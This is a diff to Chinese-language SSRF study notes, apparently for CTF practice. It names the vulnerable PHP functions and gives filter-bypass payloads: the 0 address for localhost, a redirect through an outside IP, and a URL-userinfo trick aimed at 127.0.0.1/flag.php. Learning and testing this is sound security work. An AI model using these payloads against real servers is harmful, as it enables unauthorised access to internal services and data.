@@ -8,15 +8,22 @@ SSRF (Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击
 
 ### PHP
 在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数
-
+***
 * curl()
 
-curl(127.0.0.1:flag.php)
+形如:
 
+curl(url)
 
+***
 
+* file_get_contents()
 
+形如:
 
+file_get_contents($_POST['url']);
+
+***
 
 ### 绕过
 
@@ -52,4 +59,22 @@ http://spoofed.burpcollaborator.net/flag.php
 linux中 0 指向本机地址
 
 payload： url=http://0/flag.php
+````
+
+<br>
+
+重定向（如果代码只能读取远程url，可以用这个方法）
+````
+url=http://106.53.207.220/SSRFDNS.php
+````
+
+<br>
+
+URL构成绕过
+````
+在 URL 构成中，username 是指用于身份验证的用户名。例如，在 HTTP Basic 认证中，可以使用类似以下的 URL 来进行身份验证：
+
+http://user:password@example.com/
+
+可以用来让url忽略一些重要部分比如url=http://ctf.:passwd@127.0.0.1/flag.php#show等效于127.0.0.1/flag.php
 ````
